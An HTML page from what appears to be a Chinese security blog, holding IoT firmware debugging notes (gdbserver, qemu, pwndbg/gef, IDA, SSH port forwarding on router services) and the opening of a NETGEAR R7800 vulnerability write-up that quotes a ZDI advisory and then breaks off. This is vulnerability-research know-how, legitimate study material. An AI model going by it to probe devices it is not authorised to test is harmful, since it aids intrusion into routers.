class="string">"<span class="variable">$OK</span>#9a"</span>); [noack mode]</span><br><span class="line">[getpkt: discarding char <span class="string">'+'</span>]</span><br><span class="line">getpkt (<span class="string">"QProgramSignals:0;1;3;4;6;7;8;9;c;f;10;11;12;13;14;15;16;17;18;19;1a;1b;1c;1d;1e;1f;20;21;22;23;24;25;26;27;28;29;2a;2b;2c;2d;2e;2f;30;31;32;33;34;35;36;37;38;39;3a;3b;3c;3d;3e;3f;40;41;42;43;44;45;46;47;48;49;4a;4b;4c;4d;4e;4f;50;51;52;53;54;55;56;57;58;59;5a;5b;5c;5d;5e;5f;60;61;62;63;64;65;66;67;68;69;6a;6b;6c;6d;6e;6f;70;71;72;73;74;75;76;77;78;79;7a;7b;7c;7d;7e;7f;80;81;82;83;84;85;86;87;88;89;8a;8b;8c;8d;8e;8f;90;91;92;93;94;95;96;97;98;99;9a;"</span>);  [no ack sent]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$OK</span>#9a"</span>); [noack mode]</span><br><span class="line">getpkt (<span class="string">"Hgp0.0"</span>);  [no ack sent]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$OK</span>#9a"</span>); [noack mode]</span><br><span class="line">getpkt (<span class="string">"qXfer:features:read:target.xml:0,fff"</span>);  [no ack sent]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$l</span>&lt;target&gt;&lt;architecture&gt;arm&lt;/architecture&gt;&lt;/target&gt;#06"</span>); [noack mode]</span><br><span class="line">getpkt (<span class="string">"QNonStop:0"</span>);  [no ack sent]</span><br><span class="line">[all-stop mode enabled]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$OK</span>#9a"</span>); [noack mode]</span><br><span class="line">getpkt (<span class="string">"qTStatus"</span>);  [no ack sent]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$#00</span>"</span>); [noack mode]</span><br><span class="line">getpkt (<span class="string">"?"</span>);  [no ack sent]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$T050b</span>:0*"</span>00;0d:b0deffbe;0f:30f90a40;thread:p46bc.46bc;core:0;<span class="comment">#cc"); [noack mode]</span></span><br><span class="line">getpkt (<span class="string">"qXfer:threads:read::0,fff"</span>);  [no ack sent]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$l</span>&lt;threads&gt;</span></span><br><span class="line"><span class="string">&lt;thread id="</span>p46bc.46bc<span class="string">" core="</span>0<span class="string">"/&gt;</span></span><br><span class="line"><span class="string">&lt;/threads&gt;</span></span><br><span class="line"><span class="string">#88"</span>); [noack mode]</span><br><span class="line">getpkt (<span class="string">"qAttached:46bc"</span>);  [no ack sent]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$0</span>#30"</span>); [noack mode]</span><br><span class="line">getpkt (<span class="string">"Hc-1"</span>);  [no ack sent]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$E01</span>#a6"</span>); [noack mode]</span><br><span class="line">getpkt (<span class="string">"qOffsets"</span>);  [no ack sent]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$#00</span>"</span>); [noack mode]</span><br><span class="line">getpkt (<span class="string">"qXfer:libraries-svr4:read::0,fff"</span>);  [no ack sent]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$l</span>&lt;library-list-svr4 version="</span>1.0<span class="string">"/&gt;#e5"</span>); [noack mode]</span><br><span class="line">getpkt (<span class="string">"qXfer:auxv:read::0,1000"</span>);  [no ack sent]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$l</span>"</span>); [noack mode]</span><br><span class="line">getpkt (<span class="string">"qXfer:libraries-svr4:read::0,fff"</span>);  [no ack sent]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$l</span>&lt;library-list-svr4 version="</span>1.0<span class="string">"/&gt;#e5"</span>); [noack mode]</span><br><span class="line">getpkt (<span class="string">"qSymbol::"</span>);  [no ack sent]</span><br><span class="line">Segmentation fault</span><br><span class="line"><span class="comment"># ps|grep upnp</span></span><br><span class="line">18311 admin      2492 S   upnpd-62</span><br><span class="line">18423 admin      2892 S   grep upnp</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">lxl@ubuntu:~/Desktop/000$ gdb-multiarch -q</span><br><span class="line">pwndbg: loaded 194 commands. Type pwndbg [filter] <span class="keyword">for</span> a list.</span><br><span class="line">pwndbg: created <span class="variable">$rebase</span>, <span class="variable">$ida</span> gdb <span class="built_in">functions</span> (can be used with <span class="built_in">print</span>/<span class="built_in">break</span>)</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> endian little</span><br><span class="line">The target is assumed to be little endian</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> architecture arm</span><br><span class="line">The target architecture is assumed to be arm</span><br><span class="line">pwndbg&gt; file upnpd-62</span><br><span class="line">Reading symbols from upnpd-62...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> follow-fork-mode child</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> sysroot ./squashfs-root/</span><br><span class="line">pwndbg&gt; target remote 192.168.10.1:1234</span><br><span class="line">Remote debugging using 192.168.10.1:1234</span><br><span class="line">Reading symbols from ./squashfs-root/lib/ld-uClibc.so.0...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Error <span class="keyword">while</span> reading shared library symbols <span class="keyword">for</span> ./squashfs-root/lib/ld-uClibc.so.0:</span><br><span class="line">Remote connection closed</span><br><span class="line">/build/gdb-veKdC1/gdb-8.1.1/gdb/thread.c:93: internal-error: thread_info* inferior_thread(): Assertion `tp<span class="string">' failed.</span></span><br><span class="line"><span class="string">A problem internal to GDB has been detected,</span></span><br><span class="line"><span class="string">further debugging may prove unreliable.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">This is a bug, please report it.  For instructions, see:</span></span><br><span class="line"><span class="string">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Aborted (core dumped)</span></span><br></pre></td></tr></table></figure>
<ul>
<li>远程调试：gdbserver附加进程//here（同上</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ./gdbserver.armv7_7.7 :1234 --attach 18792</span></span><br><span class="line">Attached; pid = 18792</span><br><span class="line">Listening on port 1234</span><br><span class="line">Remote debugging from host 192.168.10.2</span><br><span class="line">Segmentation fault</span><br><span class="line"></span><br><span class="line">lxl@ubuntu:~/Desktop/000$ gdb-multiarch -q</span><br><span class="line">pwndbg: loaded 194 commands. Type pwndbg [filter] <span class="keyword">for</span> a list.</span><br><span class="line">pwndbg: created <span class="variable">$rebase</span>, <span class="variable">$ida</span> gdb <span class="built_in">functions</span> (can be used with <span class="built_in">print</span>/<span class="built_in">break</span>)</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> endian little</span><br><span class="line">The target is assumed to be little endian</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> architecture arm</span><br><span class="line">The target architecture is assumed to be arm</span><br><span class="line">pwndbg&gt; file upnpd-62</span><br><span class="line">Reading symbols from upnpd-62...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> sysroot ./squashfs-root/</span><br><span class="line">pwndbg&gt; target remote 192.168.10.1:1234</span><br><span class="line">Remote debugging using 192.168.10.1:1234</span><br><span class="line">warning: .dynamic section <span class="keyword">for</span> <span class="string">"./squashfs-root/usr/lib/libnvram.so"</span> is not at the expected address (wrong library or version mismatch?)</span><br><span class="line">warning: .dynamic section <span class="keyword">for</span> <span class="string">"./squashfs-root/usr/lib/libacos_shared.so"</span> is not at the expected address (wrong library or version mismatch?)</span><br><span class="line">Reading symbols from ./squashfs-root/usr/lib/libnvram.so...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Error <span class="keyword">while</span> reading shared library symbols <span class="keyword">for</span> ./squashfs-root/usr/lib/libnvram.so:</span><br><span class="line">Remote connection closed</span><br><span class="line">Reading symbols from ./squashfs-root/usr/lib/libacos_shared.so...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Reading symbols from ./squashfs-root/usr/lib/libnat.so...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Reading symbols from ./squashfs-root/lib/libcrypt.so.0...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Reading symbols from ./squashfs-root/lib/libgcc_s.so.1...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Reading symbols from ./squashfs-root/lib/libc.so.0...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Reading symbols from ./squashfs-root/lib/libm.so.0...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Reading symbols from ./squashfs-root/lib/ld-uClibc.so.0...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">/build/gdb-veKdC1/gdb-8.1.1/gdb/thread.c:93: internal-error: thread_info* inferior_thread(): Assertion `tp<span class="string">' failed.</span></span><br><span class="line"><span class="string">A problem internal to GDB has been detected,</span></span><br><span class="line"><span class="string">further debugging may prove unreliable.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">This is a bug, please report it.  For instructions, see:</span></span><br><span class="line"><span class="string">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Aborted (core dumped)</span></span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://21guns.top/2021/03/31/iot/iot设备动态调试-总结/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="21Guns">
      <meta itemprop="description" content>
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="have a nice day">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/31/iot/iot设备动态调试-总结/" class="post-title-link" itemprop="url">iot设备动态调试-总结</a>
        </h2>

        <div class="post-meta">

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-03-31 14:41:33" itemprop="dateCreated datePublished" datetime="2021-03-31T14:41:33+08:00">2021-03-31</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-21 16:06:26" itemprop="dateModified" datetime="2022-02-21T16:06:26+08:00">2022-02-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/IOT安全/" itemprop="url" rel="index"><span itemprop="name">IOT安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>[toc]</p>
<h1 id="iot设备动态调试-总结"><a href="#iot设备动态调试-总结" class="headerlink" title="iot设备动态调试-总结"></a>iot设备动态调试-总结</h1><h1 id="linux-server-ida"><a href="#linux-server-ida" class="headerlink" title="linux_server+ida"></a>linux_server+ida</h1><p><a href="https://blog.csdn.net/abc_670/article/details/80066817" target="_blank" rel="noopener">https://blog.csdn.net/abc_670/article/details/80066817</a></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/zld<span class="comment"># ./linux_server </span></span><br><span class="line">IDA Linux 32-bit remote debug server(ST) v7.5.26. Hex-Rays (c) 2004-2020</span><br><span class="line">Listening on 0.0.0.0:23946...</span><br><span class="line"></span><br><span class="line">ida： 300BDQ1C0.bin ./unzip.mips -f compress.img -D out</span><br></pre></td></tr></table></figure>
<h1 id="gdbserver-gdb-ida"><a href="#gdbserver-gdb-ida" class="headerlink" title="gdbserver+gdb/ida"></a>gdbserver+gdb/ida</h1><ul>
<li>获取进程ID：ps|grep -v grep |grep netns |awk ‘{print $1}’</li>
<li>启动gdbserver：./gdbserver-7.7.1-armhf-eabi5-v1-sysv :1234 –attach <code>ps|grep -v grep |grep upnpd |awk &#39;{print $1}&#39;</code>（前者调试端口，后者进程ID，冒号前有空格</li>
<li>也可以不附加直接启动：/home/gdbserver.arm6.8 :1234 /home/Sofia_unpack</li>
<li>Ubuntu：gdb-multiarch usr/sbin/upnpd、target remote 10.10.10.2:1234</li>
<li>ida也可</li>
</ul>
<h1 id="qemu作为gdbserver"><a href="#qemu作为gdbserver" class="headerlink" title="qemu作为gdbserver"></a>qemu作为gdbserver</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lxl@ubuntu:~/Desktop/25/_mtd1ro.bin.extracted/squashfs-root$ cp $(<span class="built_in">which</span> qemu-arm-static) .</span><br><span class="line">lxl@ubuntu:~/Desktop/25/_mtd1ro.bin.extracted/squashfs-root$ ls</span><br><span class="line">1_var_Sofia  bin  boot  dev  etc  home  lib  linuxrc  mnt  opt  proc  qemu-arm-static  root  sbin  share  slv  sys  usr  var</span><br><span class="line">lxl@ubuntu:~/Desktop/25/_mtd1ro.bin.extracted/squashfs-root$ sudo chroot . ./qemu-arm-static -g 1234 1_var_Sofia </span><br><span class="line">HTTPD: fd: 6, IP: 0x18ea8c0</span><br></pre></td></tr></table></figure>
<h1 id="gdb-gdbserver"><a href="#gdb-gdbserver" class="headerlink" title="gdb+gdbserver"></a>gdb+gdbserver</h1><p><a href="https://mp.weixin.qq.com/s/VL0FNkndDKdYcoVF6-libg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/VL0FNkndDKdYcoVF6-libg</a></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="配置gdb-multiarch"><a href="#配置gdb-multiarch" class="headerlink" title="配置gdb-multiarch"></a>配置gdb-multiarch</h1><ul>
<li><p>安装：sudo apt install gdb-multiarch</p>
</li>
<li><p>pwngdb：<a href="https://github.com/pwndbg/pwndbg" target="_blank" rel="noopener">https://github.com/pwndbg/pwndbg</a></p>
</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg</span><br><span class="line"><span class="built_in">cd</span> pwndbg</span><br><span class="line">./setup.sh</span><br><span class="line"><span class="comment"># 成功后，～/.gdbinit</span></span><br><span class="line"><span class="built_in">source</span> /home/lxl/tools/pwndbg/gdbinit.py</span><br></pre></td></tr></table></figure>
<ul>
<li>gef：<a href="https://github.com/hugsy/gef" target="_blank" rel="noopener">https://github.com/hugsy/gef</a></li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 成功后，～/.gdbinit</span></span><br><span class="line"><span class="built_in">source</span> /home/lxl/.gdbinit-gef.py</span><br></pre></td></tr></table></figure>
<ul>
<li>切换二者：～/.gdbinit中另一个注释掉即可</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#source /home/lxl/.gdbinit-gef.py</span></span><br><span class="line"><span class="built_in">source</span> /home/lxl/tools/pwndbg/gdbinit.py</span><br></pre></td></tr></table></figure>
<h1 id="寻找适合的的gdb-server版本-here"><a href="#寻找适合的的gdb-server版本-here" class="headerlink" title="寻找适合的的gdb/server版本//here"></a>寻找适合的的gdb/server版本//here</h1><ul>
<li>arm类型太多，怎么找？</li>
</ul>
<h1 id="交叉编译"><a href="#交叉编译" class="headerlink" title="交叉编译"></a>交叉编译</h1><h1 id="gdb-multiarch使用"><a href="#gdb-multiarch使用" class="headerlink" title="gdb-multiarch使用"></a>gdb-multiarch使用</h1><ul>
<li>pwndbp与gef，一个不行就换另一个，总是会有莫名其妙的错误</li>
<li><p>gdb-gef指令显示失败，多是条件跳转语句，无视，直接ni即可</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[!] Command <span class="string">'context'</span> failed to execute properly, reason: </span><br><span class="line">0x100aef74 <span class="keyword">in</span> ?? ()</span><br><span class="line">.text:100AEF74                 beqz    <span class="variable">$v0</span>, loc_100AEF9C</span><br><span class="line"></span><br><span class="line">[!] Command <span class="string">'context'</span> failed to execute properly, reason: </span><br><span class="line">0x100aefb8 <span class="keyword">in</span> ?? ()</span><br><span class="line">.text:100AEFB8                 beqz    <span class="variable">$v0</span>, loc_100AF028</span><br></pre></td></tr></table></figure>
</li>
<li><p>一般步骤</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">./gdbserver.mips64r2_octeon2_x64_static_6.8 --attach :1234 `./busybox-mips64 pidof webs`</span><br><span class="line"></span><br><span class="line">gef➤  <span class="built_in">set</span> architecture mips</span><br><span class="line">The target architecture is assumed to be mips</span><br><span class="line">gef➤  <span class="built_in">set</span> sysroot ./</span><br><span class="line">gef➤  file bin/webs </span><br><span class="line">Reading symbols from bin/webs...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">gef➤  b *0x100AED6C</span><br><span class="line">Breakpoint 1 at 0x100aed6c</span><br><span class="line">gef➤  target remote 192.168.1.1:1234</span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br></pre></td></tr></table></figure>
</li>
<li><p>动态库没导入</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">gef➤  target remote 192.168.100.1:1234</span><br><span class="line">Remote debugging using 192.168.100.1:1234</span><br><span class="line">warning: Could not load shared library symbols <span class="keyword">for</span> /uclibc/lib/libc.so.0.</span><br><span class="line">Do you need <span class="string">"set solib-search-path"</span> or <span class="string">"set sysroot"</span>?</span><br><span class="line"></span><br><span class="line">gef➤  i sharedlibrary </span><br><span class="line">From        To          Syms Read   Shared Object Library</span><br><span class="line">0x2abb3ff0  0x2abe2e50  Yes (*)     ./uclibc/lib/libcm.so</span><br><span class="line">0x2acf3c30  0x2ad04770  Yes (*)     ./uclibc/lib/libgcc_s.so.1</span><br><span class="line">                        No          /uclibc/lib/libc.so.0</span><br><span class="line">0x2aaa89f0  0x2aaac310  Yes (*)     ./uclibc/lib/ld-uClibc.so.0</span><br><span class="line">(*): Shared library is missing debugging information.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 原因：是链接文件，并且找不到最终指向</span></span><br><span class="line">/squashfs-root$ ls uclibc/lib/libc.so.0 -l</span><br><span class="line">lrwxr-xr-x 1 501 dialout 19 Jul 20 10:45 uclibc/lib/libc.so.0 -&gt; libuClibc-0.9.28.so</span><br><span class="line">/squashfs-root$ find ./ -name <span class="string">"libuClibc-0.9.28.so"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 并非搜索路径问题</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>动态库搜索路径</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 相关指令</span></span><br><span class="line"><span class="built_in">set</span> solib-search-path</span><br><span class="line"><span class="built_in">set</span> sysroot（即<span class="built_in">set</span> solib-absolute-prefix</span><br><span class="line">info sharedlibrary</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">https://blog.csdn.net/_xiao/article/details/23289971、https://www.cntofu.com/book/46/gdb/solib-absolute-prefix_he_solib_-_search_-_path_de_.md</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h1 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h1><h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mac、ssh（源、目的、中间</span></span><br><span class="line">ssh -L 9000:192.168.100.2:80 root@192.168.142.182</span><br><span class="line">http://127.0.0.1:9000</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Windows、xshell</span></span><br><span class="line"><span class="comment"># https://blog.csdn.net/qq_34039315/article/details/77510923</span></span><br><span class="line"><span class="comment"># 右键属性、隧道、添加、类型是本地（拔出）</span></span><br><span class="line"><span class="comment"># 通过此中间主机，将目标转到源</span></span><br><span class="line">源主机：localhost</span><br><span class="line">侦听端口：9000</span><br><span class="line">目标主机：192.168.100.2</span><br><span class="line">目标端口：80</span><br></pre></td></tr></table></figure>
<h2 id="linux-server-ida-1"><a href="#linux-server-ida-1" class="headerlink" title="linux_server+ida"></a>linux_server+ida</h2><p><a href="https://blog.csdn.net/abc_670/article/details/80066817" target="_blank" rel="noopener">https://blog.csdn.net/abc_670/article/details/80066817</a></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/zld<span class="comment"># ./linux_server </span></span><br><span class="line">IDA Linux 32-bit remote debug server(ST) v7.5.26. Hex-Rays (c) 2004-2020</span><br><span class="line">Listening on 0.0.0.0:23946...</span><br><span class="line"></span><br><span class="line">ida： 300BDQ1C0.bin ./unzip.mips -f compress.img -D out</span><br></pre></td></tr></table></figure>
<h2 id="gdbserver-gdb-ida-1"><a href="#gdbserver-gdb-ida-1" class="headerlink" title="gdbserver+gdb/ida"></a>gdbserver+gdb/ida</h2><ul>
<li>获取进程ID：ps|grep -v grep |grep netns |awk ‘{print $1}’</li>
<li>启动gdbserver：./gdbserver-7.7.1-armhf-eabi5-v1-sysv :1234 –attach <code>ps|grep -v grep |grep upnpd |awk &#39;{print $1}&#39;</code>（前者调试端口，后者进程ID，冒号前有空格</li>
<li>也可以不附加直接启动：/home/gdbserver.arm6.8 :1234 /home/Sofia_unpack</li>
<li>Ubuntu：gdb-multiarch usr/sbin/upnpd、target remote 10.10.10.2:1234</li>
<li>ida也可</li>
</ul>
<h2 id="qemu作为gdbserver-1"><a href="#qemu作为gdbserver-1" class="headerlink" title="qemu作为gdbserver"></a>qemu作为gdbserver</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lxl@ubuntu:~/Desktop/25/_mtd1ro.bin.extracted/squashfs-root$ cp $(<span class="built_in">which</span> qemu-arm-static) .</span><br><span class="line">lxl@ubuntu:~/Desktop/25/_mtd1ro.bin.extracted/squashfs-root$ ls</span><br><span class="line">1_var_Sofia  bin  boot  dev  etc  home  lib  linuxrc  mnt  opt  proc  qemu-arm-static  root  sbin  share  slv  sys  usr  var</span><br><span class="line">lxl@ubuntu:~/Desktop/25/_mtd1ro.bin.extracted/squashfs-root$ sudo chroot . ./qemu-arm-static -g 1234 1_var_Sofia </span><br><span class="line">HTTPD: fd: 6, IP: 0x18ea8c0</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://21guns.top/2021/03/30/iot/NETGEAR R7800漏洞定位及分析/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="21Guns">
      <meta itemprop="description" content>
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="have a nice day">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/30/iot/NETGEAR R7800漏洞定位及分析/" class="post-title-link" itemprop="url">NETGEAR R7800漏洞定位及分析</a>
        </h2>

        <div class="post-meta">

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-03-30 14:41:33" itemprop="dateCreated datePublished" datetime="2021-03-30T14:41:33+08:00">2021-03-30</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-22 09:19:41" itemprop="dateModified" datetime="2022-02-22T09:19:41+08:00">2022-02-22</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/IOT安全/" itemprop="url" rel="index"><span itemprop="name">IOT安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>[toc]</p>
<h1 id="NETGEAR-R7800漏洞定位及分析"><a href="#NETGEAR-R7800漏洞定位及分析" class="headerlink" title="NETGEAR R7800漏洞定位及分析"></a>NETGEAR R7800漏洞定位及分析</h1><blockquote>
<p>命令注入和认证绕过的组合漏洞、内网</p>
</blockquote>
<h2 id="通告"><a href="#通告" class="headerlink" title="通告"></a>通告</h2><ul>
<li>认证绕过</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://www.zerodayinitiative.com/advisories/ZDI-21-252/</span></span><br><span class="line">(Pwn2Own) NETGEAR Nighthawk R7800 Use of Hard-coded Password Authentication Bypass Vulnerability</span><br><span class="line"></span><br><span class="line">This vulnerability allows network-adjacent attackers to bypass authentication on affected installations of NETGEAR R7800. Authentication is not required to exploit this vulnerability.</span><br><span class="line"></span><br><span class="line">The specific flaw exists within the apply_save.cgi endpoint. This issue results from the use of hard-coded encryption key. An attacker can leverage this vulnerability to execute arbitrary code <span class="keyword">in</span> the context of root.</span><br></pre></td></tr></table></figure>
<ul>
<li>命令注入</li>
</ul>
